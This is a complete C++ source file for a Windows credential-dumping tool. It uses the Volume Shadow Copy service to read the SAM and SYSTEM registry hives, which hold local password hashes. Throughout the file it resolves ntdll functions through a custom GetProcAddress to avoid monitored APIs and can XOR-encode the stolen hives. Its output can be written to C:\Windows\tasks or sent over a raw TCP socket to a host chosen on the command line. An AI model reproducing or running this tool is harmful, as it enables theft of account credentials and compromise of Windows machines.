#include <ws2tcpip.h>
#include <iostream>
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>
#pragma comment(lib, "vssapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define DEBUG_LEVEL 1    // 0: No debug (Only errors); 1: Basic info; 2: Debugging
#define FILE_OPEN 0x00000001
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000010

struct FileHeader { char filename[32]; uint32_t filesize; uint32_t checksum; };
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef NTSTATUS(WINAPI* NtCreateFileFn)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSTATUS(WINAPI* NtReadFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
typedef NTSTATUS(WINAPI* NtCloseFn)(HANDLE Handle);
typedef NTSTATUS(WINAPI* NtWriteFileFn)(HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);

NtCreateFileFn NtCreateFile;
NtReadFileFn NtReadFile;
NtCloseFn NtClose;
NtWriteFileFn NtWriteFile;


// Cast to wstring
std::wstring GuidToWString(GUID id) {
    wchar_t buf[64];
    StringFromGUID2(id, buf, 64);
    return std::wstring(buf);
}


// Print results only if debugging
void PrintHR(const char* label, HRESULT hr) {
    if (DEBUG_LEVEL >= 2) {
        std::cout << label << " -> 0x" << std::hex << hr << std::dec;
        if (FAILED(hr)) std::cout << " [FAILED]";
        std::cout << std::endl;
    }
}


// Find if there are shadow copies, if there are return the Device Object of the first one
BOOL list_shadows(std::wstring& outDeviceObject) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    PrintHR("CoInitializeEx", hr);
    if (FAILED(hr)) return FALSE;

    IVssBackupComponents* pBackup = nullptr;
    hr = CreateVssBackupComponents(&pBackup);
    PrintHR("CreateVssBackupComponents", hr);
    if (FAILED(hr) || !pBackup) {
        CoUninitialize();
        return FALSE;
    }

    hr = pBackup->InitializeForBackup();
    PrintHR("InitializeForBackup", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return FALSE;
    }

    hr = pBackup->SetContext(VSS_CTX_ALL);
    PrintHR("SetContext", hr);
    if (FAILED(hr)) {
        hr = pBackup->SetContext(VSS_CTX_BACKUP);
        PrintHR("SetContext (BACKUP fallback)", hr);
    }

    IVssEnumObject* pEnum = nullptr;
    hr = pBackup->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pEnum);
    PrintHR("IVssBackupComponents::Query", hr);
    if (FAILED(hr) || !pEnum) {
        pBackup->Release();
        CoUninitialize();
        return FALSE;
    }

    VSS_OBJECT_PROP prop = {};
    ULONG fetched = 0;
    BOOL found = FALSE;

    while (true) {
        hr = pEnum->Next(1, &prop, &fetched);
        if (hr == S_FALSE || fetched == 0) break;
        if (FAILED(hr)) {
            PrintHR("IVssEnumObject::Next", hr);
            break;
        }

        if (prop.Type == VSS_OBJECT_SNAPSHOT) {
            VSS_SNAPSHOT_PROP& snap = prop.Obj.Snap;

            if (snap.m_pwszSnapshotDeviceObject) {
                outDeviceObject = snap.m_pwszSnapshotDeviceObject;
                found = TRUE;
                VssFreeSnapshotProperties(&snap);
                break;
            }
            VssFreeSnapshotProperties(&snap);
        }
    }

    pEnum->Release();
    pBackup->Release();
    CoUninitialize();

    return found;
}


// Create Shadow Copy
HRESULT create_shadow(const std::wstring& volumePath, std::wstring& outDeviceObject) {
    if (DEBUG_LEVEL >= 1) {
        std::wcout << L"[+] Creating Shadow Copy for: " << volumePath << L"\n";
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    PrintHR("CoInitializeEx", hr);
    if (FAILED(hr)) return hr;

    IVssBackupComponents* pBackup = nullptr;
    hr = CreateVssBackupComponents(&pBackup);
    PrintHR("CreateVssBackupComponents", hr);
    if (FAILED(hr) || !pBackup) {
        CoUninitialize();
        return hr;
    }

    hr = pBackup->InitializeForBackup();
    PrintHR("InitializeForBackup", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    BOOL bSupported = FALSE;
    hr = pBackup->IsVolumeSupported(GUID_NULL, (WCHAR*)volumePath.c_str(), &bSupported);
    PrintHR("IsVolumeSupported", hr);
    if (SUCCEEDED(hr)) {
        if (DEBUG_LEVEL >= 1) {
            std::cout << "[*] Volume supports VSS: " << (bSupported ? "YES" : "NO") << std::endl;
        }
        if (!bSupported) {
            std::cout << "[-] ERROR: Volume does not support VSS" << std::endl;
            pBackup->Release();
            CoUninitialize();
            return VSS_E_VOLUME_NOT_SUPPORTED;
        }
    }

    hr = pBackup->SetContext(VSS_CTX_BACKUP);
    PrintHR("SetContext", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    hr = pBackup->SetBackupState(false, false, VSS_BT_FULL, false);
    PrintHR("SetBackupState", hr);
    
    if (DEBUG_LEVEL >= 2) {
        std::cout << "[+] Calling GatherWriterMetadata..." << std::endl;
    }
    IVssAsync* pAsyncMetadata = nullptr;
    hr = pBackup->GatherWriterMetadata(&pAsyncMetadata);
    PrintHR("GatherWriterMetadata", hr);

    if (SUCCEEDED(hr) && pAsyncMetadata) {
        if (DEBUG_LEVEL >= 2) {
            std::cout << "[-] Waiting for GatherWriterMetadata to complete..." << std::endl;
        }
        hr = pAsyncMetadata->Wait();
        PrintHR("GatherWriterMetadata Wait", hr);

        HRESULT hrMetadataStatus;
        hr = pAsyncMetadata->QueryStatus(&hrMetadataStatus, NULL);
        PrintHR("GatherWriterMetadata QueryStatus", hr);
        if (SUCCEEDED(hr)) {
            if (DEBUG_LEVEL >= 2) {
                std::cout << "[+] GatherWriterMetadata Status: 0x" << std::hex << hrMetadataStatus << std::dec << std::endl;
            }
        }
        pAsyncMetadata->Release();
    }

    if (FAILED(hr)) {
        std::cout << "[-] Failure in GatherWriterMetadata, trying to continue..." << std::endl;
        hr = S_OK;
    }

    VSS_ID snapshotSetId;
    hr = pBackup->StartSnapshotSet(&snapshotSetId);
    PrintHR("StartSnapshotSet", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    if (DEBUG_LEVEL >= 2) {
        std::wcout << L"[+] SnapshotSet ID: " << GuidToWString(snapshotSetId) << std::endl;
    }

    VSS_ID snapshotId;
    hr = pBackup->AddToSnapshotSet((WCHAR*)volumePath.c_str(), GUID_NULL, &snapshotId);
    PrintHR("AddToSnapshotSet", hr);
    if (FAILED(hr)) {
        pBackup->Release();
        CoUninitialize();
        return hr;
    }

    if (DEBUG_LEVEL >= 2) {
        std::wcout << L"[+] Snapshot ID: " << GuidToWString(snapshotId) << std::endl;
    }

    if (DEBUG_LEVEL >= 2) {
        std::cout << "[+] Calling PrepareForBackup..." << std::endl;
    }
    IVssAsync* pAsyncPrepare = nullptr;
    hr = pBackup->PrepareForBackup(&pAsyncPrepare);
    PrintHR("PrepareForBackup", hr);

    if (SUCCEEDED(hr) && pAsyncPrepare) {
        if (DEBUG_LEVEL >= 2) {
            std::cout << "[+] Waiting for PrepareForBackup to complete..." << std::endl;
        }
        hr = pAsyncPrepare->Wait();
        PrintHR("PrepareForBackup Wait", hr);

        HRESULT hrPrepareStatus;
        hr = pAsyncPrepare->QueryStatus(&hrPrepareStatus, NULL);
        PrintHR("PrepareForBackup QueryStatus", hr);
        if (SUCCEEDED(hr)) {
            if (DEBUG_LEVEL >= 2) {
                std::cout << "[+] PrepareForBackup Status: 0x" << std::hex << hrPrepareStatus << std::dec << std::endl;
            }
        }
        pAsyncPrepare->Release();
    }

    if (FAILED(hr)) {
        std::cout << "[-] Failure in PrepareForBackup, trying to continue..." << std::endl;
        hr = S_OK;
    }

    if (DEBUG_LEVEL >= 2) {
        std::cout << "[+] Calling DoSnapshotSet..." << std::endl;
    }
    IVssAsync* pAsyncSnapshot = nullptr;
    hr = pBackup->DoSnapshotSet(&pAsyncSnapshot);
    PrintHR("DoSnapshotSet", hr);

    if (SUCCEEDED(hr) && pAsyncSnapshot) {
        if (DEBUG_LEVEL >= 2) {
            std::cout << "[+] Waiting for DoSnapshotSet to complete..." << std::endl;
        }
        hr = pAsyncSnapshot->Wait();
        PrintHR("DoSnapshotSet Wait", hr);

        HRESULT hrSnapshotStatus;
        hr = pAsyncSnapshot->QueryStatus(&hrSnapshotStatus, NULL);
        PrintHR("DoSnapshotSet QueryStatus", hr);
        if (SUCCEEDED(hr)) {
            if (DEBUG_LEVEL >= 2) {
                std::cout << "[+] DoSnapshotSet Status: 0x" << std::hex << hrSnapshotStatus << std::dec << std::endl;
            }
        }
        pAsyncSnapshot->Release();
    }

    if (SUCCEEDED(hr)) {
        VSS_SNAPSHOT_PROP snapProp;
        hr = pBackup->GetSnapshotProperties(snapshotId, &snapProp);
        if (SUCCEEDED(hr)) {
            if (DEBUG_LEVEL >= 2) {
                std::wcout << L"[+] Shadow Copy Successfully Created";
                std::wcout << L"\n\t[+] Shadow ID:       " << GuidToWString(snapProp.m_SnapshotId);
                std::wcout << L"\n\t[+] Set ID:          " << GuidToWString(snapProp.m_SnapshotSetId);
                std::wcout << L"\n\t[+] Original Volume: " << (snapProp.m_pwszOriginalVolumeName ? snapProp.m_pwszOriginalVolumeName : L"(null)");
                std::wcout << L"\n\t[+] Device Object:   " << (snapProp.m_pwszSnapshotDeviceObject ? snapProp.m_pwszSnapshotDeviceObject : L"(null)");
                std::wcout << L"\n\t[+] Attributes:      0x" << std::hex << snapProp.m_lSnapshotAttributes << std::dec;
            }
            if (snapProp.m_pwszSnapshotDeviceObject) {
                outDeviceObject = snapProp.m_pwszSnapshotDeviceObject;
            }
            else {
                outDeviceObject = L"(null)";
            }

            VssFreeSnapshotProperties(&snapProp);
        }
        else {
            PrintHR("GetSnapshotProperties", hr);
        }
    }

    pBackup->Release();
    CoUninitialize();

    return hr;
}


// Send one file over socket
bool send_file_over_socket(SOCKET sock, const std::string& filename, const std::vector<BYTE>& filedata) {
    FileHeader header;
    memset(&header, 0, sizeof(header));

    strncpy_s(header.filename, sizeof(header.filename), filename.c_str(), _TRUNCATE);
    header.filesize = htonl(static_cast<uint32_t>(filedata.size()));
    header.checksum = htonl(0);

    int bytes_sent = send(sock, reinterpret_cast<const char*>(&header), sizeof(header), 0);
    if (bytes_sent != sizeof(header)) {
        printf("[-] Error sending header for %s.\n", filename.c_str());
        return false;
    }

    bytes_sent = send(sock, reinterpret_cast<const char*>(filedata.data()), static_cast<int>(filedata.size()), 0);
    if (bytes_sent != filedata.size()) {
        printf("[-] Error sending data for %s.\n", filename.c_str());
        return false;
    }

    if (DEBUG_LEVEL >= 1) {
        printf("[+] %s sent (%zu bytes)\n", filename.c_str(), filedata.size());
    }
    return true;
}


// Create socket and send all files
bool send_files_remotely(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const char* host, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] Error initializing Winsock.\n");
        return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] Error creating socket.\n");
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, host, &serverAddr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("[-] Error conneting to %s:%d\n", host, port);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    if (DEBUG_LEVEL >= 1) {
        printf("[+] Connected to %s:%d\n", host, port);
    }

    bool success = true;
    success &= send_file_over_socket(sock, "SAM", sam_data);
    success &= send_file_over_socket(sock, "SYSTEM", system_data);

    closesocket(sock);
    WSACleanup();

    return success;
}


// Open file using NtCreateFile
HANDLE OpenFileNT(const wchar_t* filePath) {
    UNICODE_STRING unicodeString;
    unicodeString.Buffer = (PWSTR)filePath;
    unicodeString.Length = (USHORT)(wcslen(filePath) * sizeof(wchar_t));
    unicodeString.MaximumLength = unicodeString.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objectAttributes;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.ObjectName = &unicodeString;
    objectAttributes.Attributes = 0x40;
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE fileHandle = NULL;

    NTSTATUS status = NtCreateFile(
        &fileHandle,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        0,
        FILE_SHARE_READ,
        FILE_OPEN,
        0,
        NULL,
        0
    );

    if (status != 0) {
        printf("[-] Error opening the file. NTSTATUS: 0x%08X\n", status);
        return NULL;
    }

    return fileHandle;
}


// Read bytes using NtReadFile
std::vector<BYTE> ReadBytesNT(HANDLE fileHandle) {
    std::vector<BYTE> fileContent;
    IO_STATUS_BLOCK ioStatusBlock;
    LARGE_INTEGER byteOffset = { 0 };

    while (TRUE) {
        BYTE buffer[1024];

        NTSTATUS status = NtReadFile(
            fileHandle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            buffer,
            sizeof(buffer),
            &byteOffset,
            NULL
        );

        if (status != 0 && status != 0x00000103) {
            if (status == 0x80000006) break;
            printf("[-] Error reading. NTSTATUS: 0x%08X\n", status);
            break;
        }

        DWORD bytesRead = (DWORD)ioStatusBlock.Information;
        if (bytesRead == 0) break;

        fileContent.insert(fileContent.end(), buffer, buffer + bytesRead);
        byteOffset.QuadPart += bytesRead;
    }

    return fileContent;
}


// Read files
std::vector<BYTE> read_file(const wchar_t* filePath, bool printBool) {
    std::vector<BYTE> fileContent;
    
    // Open file
    HANDLE fileHandle = OpenFileNT(filePath);
    if (!fileHandle) {
        printf("[-] Error: Not possible to open the file.\n");
        return fileContent;
    }

    // Read bytes
    fileContent = ReadBytesNT(fileHandle);
    if (DEBUG_LEVEL >= 1 && printBool) {
        printf("[+] Read %zu bytes from %ls\n", fileContent.size(), filePath);
    }
    
    // Close handle
    NtClose(fileHandle);
    return fileContent;
}


// Write files with NtCreateFile and NtWriteFile
BOOL WriteFileNT(const wchar_t* filePath, const std::vector<BYTE>& fileData) {
    UNICODE_STRING unicodeString;
    unicodeString.Buffer = (PWSTR)filePath;
    unicodeString.Length = (USHORT)(wcslen(filePath) * sizeof(wchar_t));
    unicodeString.MaximumLength = unicodeString.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objectAttributes;
    objectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    objectAttributes.RootDirectory = NULL;
    objectAttributes.ObjectName = &unicodeString;
    objectAttributes.Attributes = 0x40; // OBJ_CASE_INSENSITIVE
    objectAttributes.SecurityDescriptor = NULL;
    objectAttributes.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE fileHandle = NULL;

    NTSTATUS status = NtCreateFile(
        &fileHandle,
        FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (status != 0) {
        printf("[-] Error creating file: %ls. NTSTATUS: 0x%08X\n", filePath, status);
        return FALSE;
    }

    if (DEBUG_LEVEL >= 2) {
        printf("[+] File created: %ls\n", filePath);
    }
    
    LARGE_INTEGER byteOffset = { 0 };
    ULONG key = 0;

    status = NtWriteFile(
        fileHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        (PVOID)fileData.data(),
        (ULONG)fileData.size(),
        &byteOffset,
        &key
    );

    if (status != 0) {
        printf("[-] Error writing to file: %ls. NTSTATUS: 0x%08X\n", filePath, status);
        NtClose(fileHandle);
        return FALSE;
    }

    if (DEBUG_LEVEL >= 1) {
        printf("[+] Written %zu bytes to %ls\n", fileData.size(), filePath);
    }

    NtClose(fileHandle);
    return TRUE;
}


// XOR-encode bytes
std::vector<BYTE> encode_bytes(const std::vector<BYTE>& dump_bytes, const std::string& key_xor) {
    std::vector<BYTE> encoded_bytes = dump_bytes;

    if (key_xor.empty()) {
        return encoded_bytes;
    }

    int key_len = key_xor.length();

    for (size_t i = 0; i < encoded_bytes.size(); i++) {
        encoded_bytes[i] = encoded_bytes[i] ^ key_xor[i % key_len];
    }

    return encoded_bytes;
}


// Save locally SAM and SYSTEM files
BOOL save_files_locally(const std::vector<BYTE>& sam_data, const std::vector<BYTE>& system_data, const std::wstring& basePath, const std::wstring& sam_fname, const std::wstring& system_fname) {
    BOOL success = TRUE;
    std::wstring samPath = L"\\??\\" + basePath + sam_fname;
    std::wstring systemPath = L"\\??\\" + basePath + system_fname;

    if (!WriteFileNT(samPath.c_str(), sam_data)) {
        printf("[-] Error storing SAM\n");
        success = FALSE;
    } // else { printf("[+] SAM stored to %ls\n", samPath.c_str()); }

    if (!WriteFileNT(systemPath.c_str(), system_data)) {
        printf("[-] Error storing SYSTEM\n");
        success = FALSE;
    } // else { printf("[+] SYSTEM stored to %ls\n", systemPath.c_str()); }

    return success;
}


// Custom implementation of GetProcAddress
void* CustomGetProcAddress(void* pDosHdr, const char* func_name) {
    // DOS header (IMAGE_DOS_HEADER)->e_lfanew
    DWORD e_lfanew_value = *(DWORD*)((BYTE*)pDosHdr + 0x3C);
    // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
    WORD sizeopthdr_value = *(WORD*)((BYTE*)pDosHdr + e_lfanew_value + 20);
    // Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
    DWORD exportTableRVA_value = *(DWORD*)((BYTE*)pDosHdr + e_lfanew_value + 136); // 24 + 112

    if (exportTableRVA_value != 0) {
        IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDosHdr + exportTableRVA_value);
        DWORD numberOfNames = exportDir->NumberOfNames;
        DWORD* addressOfFunctions = (DWORD*)((BYTE*)pDosHdr + exportDir->AddressOfFunctions);
        DWORD* addressOfNames = (DWORD*)((BYTE*)pDosHdr + exportDir->AddressOfNames);
        WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pDosHdr + exportDir->AddressOfNameOrdinals);
        for (DWORD i = 0; i < numberOfNames; i++) {
            char* functionName = (char*)((BYTE*)pDosHdr + addressOfNames[i]);
            if (strcmp(functionName, func_name) == 0) {
                WORD ordinal = addressOfNameOrdinals[i];
                DWORD functionRVA = addressOfFunctions[ordinal];
                return (BYTE*)pDosHdr + functionRVA;
            }
        }
    }
    return NULL;
}


// Initialize functions
void InitializeNTFunctions() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    NtCreateFile = (NtCreateFileFn)CustomGetProcAddress(hNtdll, "NtCreateFile");
    NtReadFile = (NtReadFileFn)CustomGetProcAddress(hNtdll, "NtReadFile");
    NtWriteFile = (NtWriteFileFn)CustomGetProcAddress(hNtdll, "NtWriteFile");
    NtClose = (NtCloseFn)CustomGetProcAddress(hNtdll, "NtClose");
    if (!NtCreateFile || !NtReadFile || !NtWriteFile || !NtClose) {
        printf("[-] Error: ntdll.dll functions addresses could not be calculated\n");
        exit(1);
    }
}


// Help message
void print_help(int argc, char* argv[]) {
    std::vector<std::string> args(argv, argv + argc);

    std::cout << "Usage: " << args[0] << " [OPTIONS]\n";
    std::cout << "Options:\n";
    std::cout << "  --save-local [BOOL]    Save locally (default: false)\n";
    std::cout << "  --output-dir DIR       Output directory (default: C:\\Windows\\tasks)\n";
    std::cout << "  --send-remote [BOOL]   Send remotely (default: false)\n";
    std::cout << "  --host IP              Host for remote sending (default: 127.0.0.1)\n";
    std::cout << "  --port PORT            Port for remote sending (default: 7777)\n";
    std::cout << "  --xor-encode [BOOL]    XOR Encode (default: false)\n";
    std::cout << "  --xor-key KEY          Enable XOR with specified key (default: SAMDump2025)\n";
    std::cout << "  --disk DISK            Disk for shadow copy (default: C:\\)\n";
    std::cout << "  --help                 Show this help\n";
    exit(0);
}


// Parse arguments
void parse_arguments(int argc, char* argv[],
    std::wstring& output_dir,
    std::wstring& diskToShadow,
    bool& xorencode,
    bool& saveLocally,
    bool& sendRemotely,
    std::string& key_xor,
    std::string& host,
    int& port) {

    // Default values
    output_dir      = L"C:\\Windows\\tasks";
    diskToShadow    = L"C:\\";
    xorencode       = false;
    saveLocally     = false;
    sendRemotely    = false;
    key_xor         = "SAMDump2025";
    host            = "127.0.0.1";
    port            = 7777;

    std::vector<std::string> args(argv, argv + argc);

    for (size_t i = 1; i < args.size(); ++i) {
        if (args[i] == "--output-dir" && i + 1 < args.size()) {
            std::string dir = args[++i];
            output_dir = std::wstring(dir.begin(), dir.end());
        }
        else if (args[i] == "--disk" && i + 1 < args.size()) {
            std::string disk = args[++i];
            diskToShadow = std::wstring(disk.begin(), disk.end());
        }
        else if (args[i] == "--xor-key" && i + 1 < args.size()) {
            key_xor = args[++i];
            xorencode = true;
        }
        else if (args[i] == "--save-local") {
            if (i + 1 < args.size() && args[i + 1].find("--") != 0) {
                std::string value = args[++i];
                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
                saveLocally = (value == "true" || value == "1" || value == "yes");
            }
            else {
                saveLocally = true;
            }
        }
        else if (args[i] == "--send-remote") {
            if (i + 1 < args.size() && args[i + 1].find("--") != 0) {
                std::string value = args[++i];
                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
                sendRemotely = (value == "true" || value == "1" || value == "yes");
            }
            else {
                sendRemotely = true;
            }
        }
        else if (args[i] == "--xor-encode") {
            if (i + 1 < args.size() && args[i + 1].find("--") != 0) {
                std::string value = args[++i];
                std::transform(value.begin(), value.end(), value.begin(), ::tolower);
                xorencode = (value == "true" || value == "1" || value == "yes");
            }
            else {
                xorencode = true;
            }
        }
        else if (args[i] == "--host" && i + 1 < args.size()) {
            host = args[++i];
        }
        else if (args[i] == "--port" && i + 1 < args.size()) {
            port = std::stoi(args[++i]);
        }
        else if (args[i] == "--help") {
            print_help(argc, argv);
        }
    }

    if (DEBUG_LEVEL >= 2) {
        std::wcout << L"Configuration:\n";
        std::wcout << L"  Output Dir: " << output_dir << L"\n";
        std::wcout << L"  Disk: " << diskToShadow << L"\n";
        std::cout << "  XOR Encode: " << (xorencode ? "true" : "false") << "\n";
        std::cout << "  XOR Key: " << key_xor << "\n";
        std::cout << "  Save Locally: " << (saveLocally ? "true" : "false") << "\n";
        std::cout << "  Send Remotely: " << (sendRemotely ? "true" : "false") << "\n";
        std::cout << "  Host: " << host << "\n";
        std::cout << "  Port: " << port << "\n";
    }
}


int main(int argc, char* argv[]) {
    // Parse arguments
    std::wstring output_dir;
    std::wstring diskToShadow;
    bool xorencode;
    bool saveLocally;
    bool sendRemotely;
    std::string key_xor;
    std::string host;
    int port;
    parse_arguments(argc, argv, output_dir, diskToShadow, xorencode, saveLocally, sendRemotely, key_xor, host, port);

    // You need to use --save-local or --send-remote
    if (!saveLocally && !sendRemotely) {
        print_help(argc, argv);
    }

    // Initialize functions
    InitializeNTFunctions();

    // Get or create Shadow Copy's Device Object
    std::wstring shadowCopyBasePath;
    bool new_shadow_created = true;
    if (list_shadows(shadowCopyBasePath)) {
        if (DEBUG_LEVEL >= 1) {
            wprintf(L"[+] Shadow Copy found: %s\n", shadowCopyBasePath.c_str());
            new_shadow_created = true;
        }
    }
    else {
        if (DEBUG_LEVEL >= 1) {
            wprintf(L"[+] No Shadow Copies found: Creating a new one.\n");
        }
        HRESULT hr = create_shadow(diskToShadow, shadowCopyBasePath);

        if (!shadowCopyBasePath.empty()) {
            std::wcout << L"[+] Shadow copy created: " << shadowCopyBasePath << std::endl;
        }
        else {
            std::cout << "\n[-] Failed to create a Shadow copy." << std::endl;
        }
    }
    size_t pos = shadowCopyBasePath.find(L"\\\\?\\");
    if (pos != std::wstring::npos) {
        shadowCopyBasePath.replace(pos, 4, L"\\??\\");
    }

    // Get bytes
    std::wstring samPath = L"\\windows\\system32\\config\\sam";
    std::wstring systemPath = L"\\windows\\system32\\config\\system";
    std::wstring fullPathSam = shadowCopyBasePath + samPath;
    std::wstring fullPathSystem = shadowCopyBasePath + systemPath;
    std::vector<BYTE> SamBytes = read_file(fullPathSam.c_str(), true);
    std::vector<BYTE> SystemBytes = read_file(fullPathSystem.c_str(), true);
  
    // Second round needed when the Shadow Copy is new (a problem with NtOpenFile I can't solve...) 
    if (new_shadow_created) {
        std::vector<BYTE> SamBytes_2 = read_file(fullPathSam.c_str(), false);
        SamBytes = SamBytes_2;
        std::vector<BYTE> SystemBytes_2 = read_file(fullPathSystem.c_str(), false);
        SystemBytes = SystemBytes_2;
    }

    // XOR-Encode
    if (xorencode) {
        std::vector<BYTE> encodedSamBytes = encode_bytes(SamBytes, key_xor);
        std::vector<BYTE> encodedSystemBytes = encode_bytes(SystemBytes, key_xor);
        SamBytes = encodedSamBytes;
        SystemBytes = encodedSystemBytes;
        if (DEBUG_LEVEL >= 1) {
            printf("[+] XOR-encoded SAM and SYSTEM content\n");
        }
    }

    // Save locally
    std::wstring sam_fname = L"\\sam.txt";
    std::wstring system_fname = L"\\system.txt";
    if (saveLocally) {
        if (save_files_locally(SamBytes, SystemBytes, output_dir, sam_fname, system_fname)) {
            if (DEBUG_LEVEL >= 1) {
                printf("[+] Success saving files locally\n");
            }
        }
        else {
            printf("[-] Error saving files locally\n");
        }
    }

    // Send remotely
    if (sendRemotely) {
        if (send_files_remotely(SamBytes, SystemBytes, host.c_str(), port)) {
            if (DEBUG_LEVEL >= 1) {
                printf("[+] Success sending files\n");
            }
        }
        else {
            printf("[-] Error sending files\n");
        }
    }

    return 0;
}